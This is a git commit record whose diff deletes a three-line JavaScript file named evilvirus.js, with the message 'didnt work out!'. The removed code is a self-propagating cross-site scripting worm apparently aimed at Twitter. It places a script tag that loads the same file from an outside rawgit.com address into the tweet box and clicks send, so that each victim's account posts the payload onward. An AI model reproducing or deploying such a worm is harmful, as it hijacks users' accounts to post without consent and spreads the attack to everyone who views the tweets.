f35605286a289cbcb8c9293359c478a622916c4e
Anna Harren <iirelu@users.noreply.github.com>
2015-05-18 17:01:14 +0100

    didnt work out!

--- evilvirus.js
+++
@@ -1,3 +0,0 @@
-var virus = "<script>s=document.createElement(\"script\");s.src=\"rawgit.com/iirelu/random/master/evilvirus.js\";document.head.appendChild(s) ♥"
-$(".js-compose-text").attr("value", virus);
-$(".js-send-tweet-button").removeClass("is-disabled").click();
